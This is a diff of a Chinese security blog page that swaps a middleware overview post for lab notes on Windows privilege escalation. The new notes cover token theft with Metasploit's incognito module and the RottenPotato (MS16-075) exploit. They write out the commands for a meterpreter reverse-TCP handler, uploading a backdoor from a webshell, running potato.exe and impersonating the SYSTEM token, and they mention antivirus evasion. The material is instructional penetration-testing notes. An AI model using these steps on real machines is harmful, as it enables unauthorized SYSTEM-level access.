@@ -20,28 +20,28 @@
 
 <script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Mist","darkmode":true,"version":"8.14.2","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"show_result":"default","style":"mac"},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":true,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":5,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
 
-    <meta name="description" content="1.Apache​		Apache HTTP服务器是一个模块化的服务器，可以运行在几乎所有广泛使用的计算机平台上。其属于应用服务器。Apache 支持支持模块多，性能稳定，Apache本身是静态解析，适合静态HTML、图片等，但可以通过扩展脚本、模块等支持动态页面等。 （Apche 可以支持PHPcgiperl，但是要使用Java的话，你需要Tomcat在Apache后台支撑，将Java请求由Ap">
+    <meta name="description" content="令牌窃取什么是令牌？ 令牌(token)是系统的临时秘钥，相当于账号和密码，用来决定是否允许这次请求和判断这次请求是属于哪一个用户的。它允许你在不提供密码或其他凭证的前提下，访问网络和系统资源，这些令牌将持续存在于系统中，除非系统重新启动。 令牌(token)是系统的临时秘钥，相当于账号和密码，用来决定是否允许这次请求和判断这次请求是属于哪一个用户的。它允许你在不提供密码或其他凭证的前提下，访问网">
 <meta property="og:type" content="article">
-<meta property="og:title" content="常见中间件的总结">
-<meta property="og:url" content="http://example.com/2023/02/06/%E5%B8%B8%E8%A7%81%E4%B8%AD%E9%97%B4%E4%BB%B6%E7%9A%84%E6%80%BB%E7%BB%93/index.html">
+<meta property="og:title" content="烂土豆web提权system">
+<meta property="og:url" content="http://example.com/2023/03/10/%E7%83%82%E5%9C%9F%E8%B1%86web%E6%8F%90%E6%9D%83system/index.html">
 <meta property="og:site_name" content="元酒InfoSec">
-<meta property="og:description" content="1.Apache​		Apache HTTP服务器是一个模块化的服务器，可以运行在几乎所有广泛使用的计算机平台上。其属于应用服务器。Apache 支持支持模块多，性能稳定，Apache本身是静态解析，适合静态HTML、图片等，但可以通过扩展脚本、模块等支持动态页面等。 （Apche 可以支持PHPcgiperl，但是要使用Java的话，你需要Tomcat在Apache后台支撑，将Java请求由Ap">
+<meta property="og:description" content="令牌窃取什么是令牌？ 令牌(token)是系统的临时秘钥，相当于账号和密码，用来决定是否允许这次请求和判断这次请求是属于哪一个用户的。它允许你在不提供密码或其他凭证的前提下，访问网络和系统资源，这些令牌将持续存在于系统中，除非系统重新启动。 令牌(token)是系统的临时秘钥，相当于账号和密码，用来决定是否允许这次请求和判断这次请求是属于哪一个用户的。它允许你在不提供密码或其他凭证的前提下，访问网">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2023-02-06T05:33:51.000Z">
-<meta property="article:modified_time" content="2023-02-27T06:39:52.068Z">
+<meta property="article:published_time" content="2023-03-10T06:10:02.000Z">
+<meta property="article:modified_time" content="2023-03-10T07:03:53.551Z">
 <meta property="article:author" content="yuanjiu">
-<meta property="article:tag" content="中间件">
+<meta property="article:tag" content="提权">
 <meta name="twitter:card" content="summary">
 
 
-<link rel="canonical" href="http://example.com/2023/02/06/%E5%B8%B8%E8%A7%81%E4%B8%AD%E9%97%B4%E4%BB%B6%E7%9A%84%E6%80%BB%E7%BB%93/">
+<link rel="canonical" href="http://example.com/2023/03/10/%E7%83%82%E5%9C%9F%E8%B1%86web%E6%8F%90%E6%9D%83system/">
 
 
 
-<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://example.com/2023/02/06/%E5%B8%B8%E8%A7%81%E4%B8%AD%E9%97%B4%E4%BB%B6%E7%9A%84%E6%80%BB%E7%BB%93/","path":"2023/02/06/常见中间件的总结/","title":"常见中间件的总结"}</script>
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://example.com/2023/03/10/%E7%83%82%E5%9C%9F%E8%B1%86web%E6%8F%90%E6%9D%83system/","path":"2023/03/10/烂土豆web提权system/","title":"烂土豆web提权system"}</script>
 
 <script class="next-config" data-name="calendar" type="application/json">""</script>
-<title>常见中间件的总结 | 元酒InfoSec</title>
+<title>烂土豆web提权system | 元酒InfoSec</title>
   
 
 
@@ -142,7 +142,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-Apache"><span class="nav-number">1.</span> <span class="nav-text">1.Apache</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-Tomcat"><span class="nav-number">2.</span> <span class="nav-text">2.Tomcat</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-Nginx"><span class="nav-number">3.</span> <span class="nav-text">3.Nginx</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-weblogic"><span class="nav-number">4.</span> <span class="nav-text">4.weblogic</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-jetty"><span class="nav-number">5.</span> <span class="nav-text">5.jetty</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6-JBoss"><span class="nav-number">6.</span> <span class="nav-text">6.JBoss</span></a></li></ol></div>
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%A4%E7%89%8C%E7%AA%83%E5%8F%96"><span class="nav-number">1.</span> <span class="nav-text">令牌窃取</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%83%82%E5%9C%9F%E8%B1%86%E6%8F%90%E6%9D%83%EF%BC%88MS16-075%EF%BC%89"><span class="nav-number">2.</span> <span class="nav-text">烂土豆提权（MS16-075）</span></a></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -200,7 +200,7 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2023/02/06/%E5%B8%B8%E8%A7%81%E4%B8%AD%E9%97%B4%E4%BB%B6%E7%9A%84%E6%80%BB%E7%BB%93/">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/03/10/%E7%83%82%E5%9C%9F%E8%B1%86web%E6%8F%90%E6%9D%83system/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.jpg">
@@ -213,12 +213,12 @@
     </span>
 
     <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="常见中间件的总结 | 元酒InfoSec">
+      <meta itemprop="name" content="烂土豆web提权system | 元酒InfoSec">
       <meta itemprop="description" content="">
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          常见中间件的总结
+          烂土豆web提权system
         </h1>
 
         <div class="post-meta-container">
@@ -228,15 +228,9 @@
         <i class="far fa-calendar"></i>
       </span>
       <span class="post-meta-item-text">发表于</span>
+      
 
-      <time title="创建时间：2023-02-06 13:33:51" itemprop="dateCreated datePublished" datetime="2023-02-06T13:33:51+08:00">2023-02-06</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar-check"></i>
-      </span>
-      <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2023-02-27 14:39:52" itemprop="dateModified" datetime="2023-02-27T14:39:52+08:00">2023-02-27</time>
+      <time title="创建时间：2023-03-10 14:10:02 / 修改时间：15:03:53" itemprop="dateCreated datePublished" datetime="2023-03-10T14:10:02+08:00">2023-03-10</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -244,7 +238,7 @@
       </span>
       <span class="post-meta-item-text">分类于</span>
         <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">学习笔记</span></a>
+          <a href="/categories/%E5%AE%9E%E9%AA%8C/" itemprop="url" rel="index"><span itemprop="name">实验</span></a>
         </span>
     </span>
 
@@ -258,20 +252,38 @@
     
     
     <div class="post-body" itemprop="articleBody">
-        <h3 id="1-Apache"><a href="#1-Apache" class="headerlink" title="1.Apache"></a>1.Apache</h3><p>​		Apache HTTP服务器是一个模块化的服务器，可以运行在几乎所有广泛使用的计算机平台上。其属于应用服务器。Apache 支持支持模块多，性能稳定，Apache本身是静态解析，适合静态HTML、图片等，但可以通过扩展脚本、模块等支持动态页面等。</p>
-<p>（Apche 可以支持PHPcgiperl，但是要使用Java的话，你需要Tomcat在Apache后台支撑，将Java请求由Apache 转发给Tomcat处理。）</p>
-<p>缺点：配置相对复杂，自身不支持动态页面。</p>
- <span id="more"></span>
+        <h2 id="令牌窃取"><a href="#令牌窃取" class="headerlink" title="令牌窃取"></a>令牌窃取</h2><p><strong>什么是令牌？</strong></p>
+<p>令牌(token)是系统的临时秘钥，相当于账号和密码，用来决定是否允许这次请求和判断这次请求是属于哪一个用户的。它允许你在不提供密码或其他凭证的前提下，访问网络和系统资源，这些令牌将持续存在于系统中，除非系统重新启动。</p>
+<p>令牌(token)是系统的临时秘钥，相当于账号和密码，用来决定是否允许这次请求和判断这次请求是属于哪一个用户的。它允许你在不提供密码或其他凭证的前提下，访问网络和系统资源，这些令牌将持续存在于系统中，除非系统重新启动。</p>
+<p><strong>令牌种类</strong></p>
+<p>访问令牌(Access Token)：表示访问控制操作主体的系统对象 。<br>会话令牌(Session Token)：是交互会话中唯一的身份标识符。<br>密保令牌(Security Token)：又叫做认证令牌或硬件令牌，是一种计算机身 份校验的物理设备，例如 U 盾。<br>      Windows 的 AccessToken 有两种类型：</p>
+<p>Delegation Token：授权令牌，它支持交互式会话登录 (例如本地用户直接 登录、远程桌面登录访问)<br>Impresonation Token：模拟令牌，它是非交互的会话 (例如使用 net use 访问共享文件夹)。<br>      （注：<code>两种 token 只在系统重启后清除 具有 Delegation token 的用户在注销后，该 Token 将变成 Impersonation，依旧有效</code>。）<br><strong>窃取过程</strong></p>
+<p>1.生成msf的后门shell</p>
+<p>2上传并运行后门（大概率要做免杀）</p>
+<p>3.msf开启监听（windows）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfconsole  </span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">set lhost x.x.x.x  // 你设置监听的ip</span><br><span class="line">set lport xxx  // 你设置监听的端口</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
 
-<h3 id="2-Tomcat"><a href="#2-Tomcat" class="headerlink" title="2.Tomcat"></a>2.Tomcat</h3><p>Tomcat 是应用（Java）服务器，它只是一个Servlet（JSP也翻译成Servlet）容器，可以认为是Apache的扩展，但是可以独立于Apache运行，适用于本地开发、小项目或个人开发，Apache为HTML页面服务，而tomcat实际操作JSP页面和servlet，但是tomcat处理静态html的能力不如Apache服务器。</p>
-<p>特点：支持最新标准、更新快、跨平台、体积小安装部署方便。</p>
-<h3 id="3-Nginx"><a href="#3-Nginx" class="headerlink" title="3.Nginx"></a>3.Nginx</h3><p>Nginx 是俄罗斯人编写的十分轻量级的HTTP服务器，Nginx，它的发音为“engine X”，是一个高性能的HTTP和反向代理服务器，同时也是一个IMAP&#x2F;POP3&#x2F;SMTP代理服务器。</p>
-<h3 id="4-weblogic"><a href="#4-weblogic" class="headerlink" title="4.weblogic"></a>4.weblogic</h3><p>大型项目或商业项目，Java动态功能和Java<br>Enterprise在大型网络应用的开发、集成、部署和管理中，引入了标准的安全性bea公司生产的基础j2ee架构中间件。</p>
-<p>特点：简化了可移植和可扩展应用系统的开发，为其他应用系统和系统提供了丰富的可操作性;商业软件功能齐全强大，主要用于大型企业的大型项目;是一种高扩展的架构体系。</p>
-<h3 id="5-jetty"><a href="#5-jetty" class="headerlink" title="5.jetty"></a>5.jetty</h3><p>jetty是使用Java语言编写，jetty运行速度快，轻量级，在Java中可以从test<br>case控制其运行。从而使自动化测试不再依赖外部环境，顺利实现自动化测试。</p>
-<p>特点：易用、可扩展、易嵌入;快速高效。</p>
-<h3 id="6-JBoss"><a href="#6-JBoss" class="headerlink" title="6.JBoss"></a>6.JBoss</h3><p>管理EJB容器和服务器，JBoss遵循商业友好LGPL授权分发，由开源社区开发。</p>
-<p>特点：应用服务器也有许多优秀的特点;内存和硬盘空间相对较小;安装方便，解压后，只需配置一些环境变量即可;JBoss支持集群等。</p>
+<p>4.成功获取会话</p>
+<p>5.incognito模块</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">伪造令牌：</span><br><span class="line">use incognito  #加载incognito模块</span><br><span class="line">list_tokens -u  #列出AccessToken</span><br><span class="line">getuid  #查看当前token</span><br><span class="line">impersonate_token &quot;NT AUTHORITY\SYSTEM&quot;  #模拟system 用户，getsystem 命令，即实现了该命令。如果要模拟其他用户，将 token 名改为其他用户即可</span><br><span class="line"></span><br><span class="line">进程窃取令牌</span><br><span class="line">steal_token 1252  #从进程窃取token</span><br><span class="line">getsystem  #提升至system 权限</span><br><span class="line">rev2self  #返回到之前的AccessToken 权限</span><br></pre></td></tr></table></figure>
+
+<h2 id="烂土豆提权（MS16-075）"><a href="#烂土豆提权（MS16-075）" class="headerlink" title="烂土豆提权（MS16-075）"></a><strong>烂土豆提权（MS16-075）</strong></h2><p>ms16-075漏洞介绍：</p>
+<p>​		Windows SMB 服务器特权提升漏洞（CVE漏洞编号：CVE-2016-3225）当攻击者转发适用于在同一计算机上运行的其他服务的身份验证请求时，Microsoft 服务器消息块 (SMB) 中存在特权提升漏洞，成功利用此漏洞的攻击者可以使用提升的特权执行任意代码。若要利用此漏洞，攻击者首先必须登录系统。然后，攻击者可以运行一个为利用此漏洞而经特殊设计的应用程序，从而控制受影响的系统。此更新通过更正Windows服务器消息块 (SMB) 服务器处理凭据转发请求的方式来修复此漏洞。微软将其定义为KB3164038</p>
+<p>RottenPotato（烂土豆）提权的原理可以简述如下：</p>
+<p>1.欺骗“NT AUTHORITY\SYSTEM”账户通过NTLM认证到我们控制的TCP终端。</p>
+<p>2.对这个认证过程使用中间人攻击（NTLM重放），为“NT AUTHORITY\SYSTEM”账户本地协商一个安全令牌。这个过程是通过一系列的Windows API调用实现的。</p>
+<p>3.模仿这个令牌。只有具有“模仿安全令牌权限的账户才能去模仿别人的令牌。一般大多数的服务型账户（llS、MSSQL等）有这个权限，而大多数用户级的账户没有这个权限。</p>
+<p>​		一般从web拿到的webshell都是IS服务器权限，是具有这个模仿权限的。测试过程中，使用已经建好的账户（就是上面说的用户级账户）去反弹meterpreter然后再去执行EXP的时候会失败，但使用莱刀（llS服务器权限）反弹meterpreter就会成功。</p>
+<p>烂土豆比热土豆的优点是：<br>1.100%可靠<br>2.全版本通杀（<code>现在要做免杀</code>）<br>3.立即生效，不用像hot potato那样有时候需要等Windows更新才能使用。<br>        总之，我对这个的理解是通过中间人攻击，将COM（NT\SYSTEM权限）在第二步挑战应答过程中认证的区块改成自己的区块获取SYSTEM令牌，然后利用msf的模仿令牌功能模仿SYSTEM令牌。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">1.拿到webshell，上传烂土豆</span><br><span class="line"></span><br><span class="line">upload /root/potato.exe C:\Users\Public</span><br><span class="line"></span><br><span class="line">2.利用窃取模块列出AccessToken</span><br><span class="line"></span><br><span class="line">cd C:\\Users\\Public </span><br><span class="line"></span><br><span class="line">use incognito </span><br><span class="line"></span><br><span class="line">list_tokens -u</span><br><span class="line"></span><br><span class="line">3.执行烂土豆</span><br><span class="line"></span><br><span class="line">execute -cH -f ./potato.exe </span><br><span class="line"></span><br><span class="line">list_tokens -u </span><br><span class="line"></span><br><span class="line">impersonate_token &quot;NT AUTHORITY\\SYSTEM&quot;</span><br><span class="line"></span><br><span class="line">4.窃取成功</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p>参考文章：</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_44159028/article/details/123429203">https://blog.csdn.net/qq_44159028/article/details/123429203</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_44029310/article/details/126110570">https://blog.csdn.net/qq_44029310/article/details/126110570</a></p>
 
     </div>
 
@@ -281,21 +293,18 @@
 
     <footer class="post-footer">
           <div class="post-tags">
-              <a href="/tags/%E4%B8%AD%E9%97%B4%E4%BB%B6/" rel="tag"><i class="fa fa-tag"></i> 中间件</a>
+              <a href="/tags/%E6%8F%90%E6%9D%83/" rel="tag"><i class="fa fa-tag"></i> 提权</a>
           </div>
 
         
 
           <div class="post-nav">
             <div class="post-nav-item">
-                <a href="/2023/02/04/%E5%8A%A0%E5%AF%86%E5%AE%9E%E9%AA%8C/" rel="prev" title="加密实验">
-                  <i class="fa fa-chevron-left"></i> 加密实验
+                <a href="/2023/03/06/ssrf%E6%80%BB%E7%BB%93/" rel="prev" title="ssrf总结">
+                  <i class="fa fa-chevron-left"></i> ssrf总结
                 </a>
             </div>
             <div class="post-nav-item">
-                <a href="/2023/02/06/web%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/" rel="next" title="web中间件常见漏洞总结">
-                  web中间件常见漏洞总结 <i class="fa fa-chevron-right"></i>
-                </a>
             </div>
           </div>
     </footer>
